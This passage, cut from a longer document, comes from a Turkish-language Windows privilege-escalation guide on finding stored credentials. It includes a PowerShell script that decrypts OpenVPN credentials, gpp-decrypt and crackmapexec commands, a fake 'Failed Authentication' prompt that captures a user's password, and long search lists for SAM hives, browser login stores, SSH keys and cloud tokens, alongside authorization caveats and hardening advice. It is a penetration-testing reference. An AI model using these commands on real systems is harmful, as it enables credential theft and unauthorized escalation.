            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Installer'lar **SYSTEM ayrıcalıklarıyla çalıştırılır** ve birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Registry (Kimlik Bilgileri)

### Destek aracı registry kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama registry anahtarları altında parola ile ilgili değer adlarını saklar. Örneğin, [satıcının registry anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9 öncesi sürümlerde yapılandırılmış statik bir oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: kimlik bilgilerini değerlendirirken kurulu sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha yetkili bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılması ve bu hesap için yetkilendirme gerekir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına dahil etmeyin.

### Korunan sayfalara sahip paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesi** ile çalışma sayfası korumasını veya gizli sütunları birbirinden ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; geniş kapsamlı envanter çıkarırken olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` yolunu uzaktan çalıştırma değişikliklerinin depolandığı yer olarak tanımlar; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini kullanan bir betiğe yapılan kaldırılmış ya da eklenmiş referansları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı, AES anahtarının şifreli dizenin yanı sıra ayrıca bulunmasını gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrı olarak sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin; ardından yetki dahilinde ilgili içeriği, rutin envanter çıktısına sırları yazdırmadan inceleyin. Yama yolu, şifrelenmiş değer veya anahtar referansı tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve derleme değişikliklerine sır eklemekten kaçının.

### Özel yerel yönetici parolası döndürme

Kurum içinde geliştirilmiş bir parola döndürücü, şifrelenmiş yerel yönetici parolasını yerel bir hizmette saklarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında tutabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, listener'ını ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback arayüzünü dinleyen bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulamanın başarılı olması, ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme seed'i veya anahtar materyali şifreli verinin yanında erişilebiliyorsa şifrelemeye güvenmeden önce tam anahtar türetme yöntemini inceleyin. Açığa çıkmış bir seed'den Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak deterministik biçimde AES anahtarı türeten bir yöntem, bu parolayı korumak için uygun değildir; Go, bu paketin güvenliğe duyarlı rastgelelik için uygun olmadığını belgeliyor. Kurtarılan herhangi bir parolayı bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış görev, `.env` yolu veya şifrelenmiş veri tek başına bu koşulların hiçbirini kanıtlamaz. Parolaları ve anahtar materyalini rutin envanter çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. LAPS'in dizin veya Entra tabanlı depolaması ve erişim denetimleri, özel yerel veri deposundan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir index'i okuyup okuyamayacağını belirler.

### Java sunucu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir özel bir eklenti, gömülü bir hizmet kimlik bilgisi içeren yapılandırma veya bytecode barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin envanter çıktısına dahil etmeyin. Eklenti yolu tek başına bir sırrın varlığını kanıtlamaz; kurtarılan bir hizmet parolası da ancak daha yetkili bir hesap için geçerliyse daha yüksek ayrıcalıklara yol açar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin düzeni için [PaperMC'nin eklenti kurulum kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap bu dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) göre parolalar düz metin olarak saklanabilir veya bu özellikte tutulan bir anahtarla şifrelenebilir. Kurtarılan bir parola, ayrıcalık yükseltme açısından yalnızca daha yetkili bir kimlik için hâlâ geçerliyse önemlidir; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisi yeniden kullanımını kanıtlar. Bu yolu yalnızca envanter ipucu olarak kullanın; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına dahil etmeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanıldığında bile yönetici konsolunun yapılandırılmış portlarını ve bind arayüzünü gösterebilir. Openfire genellikle yönetici konsolunu loopback arayüzüne bind eder; listener çalışıyorsa yerel bir hesap bu adrese yine de erişebilir. Gerçek listener'ı, yetkili yönetici rolünü, eklenti yükleme politikasını ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunu hizmet bağlamında çalıştırabilir; hizmet LocalSystem olarak çalışıyorsa bu yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adını taşıyan Velociraptor sunucu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucudaki kullanıcı rollerine, API erişilebilirliğine ve sunucunun veya hedef agent'ın çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı materyaller içerir; böyle bir yapılandırmayı bulmak sunucu CA'sına erişimi kanıtlamaz. Bazı dağıtımlar CA özel anahtarını çevrimdışı tutar; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korunan yedek kopyaların ACL'lerini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` yoludur; hizmet farklı bir yol kullanacak şekilde yapılandırılmışsa o yolu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Özel anahtarı loglara veya envanter çıktısına yazdırmaktan kaçının. Satıcının `config api_client` iş akışı, istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir ve böyle bir rol oluşturmak veya değiştirmek veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya agent bağlamında çalışır ve bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve listener erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### PuTTY Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılmış oturum yedeği ise `sessions-backup.dat` adını taşıyabilir ve başka bir konumda saklanabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parola ile şifrelendiğini ve oturumları, anahtarları, komut dosyalarını, etiketleri ve ilişkileri içerebileceğini belirtir; [destek forumunda](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depo konumu belirtilir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak parolasını ortaya çıkarmaz veya kayıtlı herhangi bir kimlik bilgisinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Birkaç SSH anahtarı oluşturup bunları `ssh-add` ile eklemeyi ve SSH üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Yanıtsız kurulum dosyaları

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Öncelikle yerel olarak erişilebilen yedekleme veya imaj dizinlerine bakın ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adının varlığı hive'ların açığa çıktığını kanıtlamaz ve standart `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanıltıcı ipuçlarıdır. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows imajlarıyla çalışma kılavuzuna](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosyası başvurusuna](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosyayı arayın

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesapları dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPO'lar) tüm etki alanı kullanıcıları tarafından erişilebilirdi. İkinci olarak, bu GPP'lerde AES256 ile şifrelenen parolalar, herkese açık olarak belgelenmiş varsayılan bir anahtar kullanılarak kimliği doğrulanmış tüm kullanıcılar tarafından çözülebilirdi. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ içinde arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları elde etmek için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Yapılandırması

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot dizinindeki yedek arşivleri

Doğrudan sunulan bir webroot dizinine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bu durumu bir veri ifşası olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde bir sır bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini iste

Kullanıcının kimlik bilgilerini, hatta farklı bir kullanıcının kimlik bilgilerini bile bildiğini düşünüyorsanız **kullanıcıdan girmesini isteyebilirsiniz** (istemciden **kimlik bilgilerini** doğrudan **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Geçmişte parolaları **düz metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe uzantısı olmadan dosya adı listesi varyantı

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş bir kasa adayı olarak değerlendirin; dosyanın varlığı onu okuyabileceğinizi, kilidini açabileceğinizi veya içinde kayıtlı kimlik bilgilerini kullanabileceğinizi göstermez. Bu tür dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş bir kasa ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce adı geçen hesabı ve NT hash'inin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişiminin, hesap haklarının ve ayrı bir hizmet çalıştırma adımının da sağlanması gerekir. Envanterde kasa yolu ve okunabilirlik bildirilmeli, veritabanının içeriği veya kayıtlı kimlik bilgileri yazdırılmamalıdır.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe uzantısı olmadan arama komutu varyantı

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz edilen dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise buna karşılık gelen `$R` girdisinde saklar; arşivi açmadan önce meta verileri ve mevcut kimliğin dosyayı okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, incelenmesi gereken bir aday olarak değerlendirin.

Erişilebilir bir silinmiş `.pfx`, **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker yayıncı kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin ilgili betiği değiştirebilmesi, yürürlükteki bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin ya da daha yüksek ayrıcalıklı başka bir bileşenin bu betiği gerçekten çalıştırması gerekir. Tek başına bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik bu zincirin 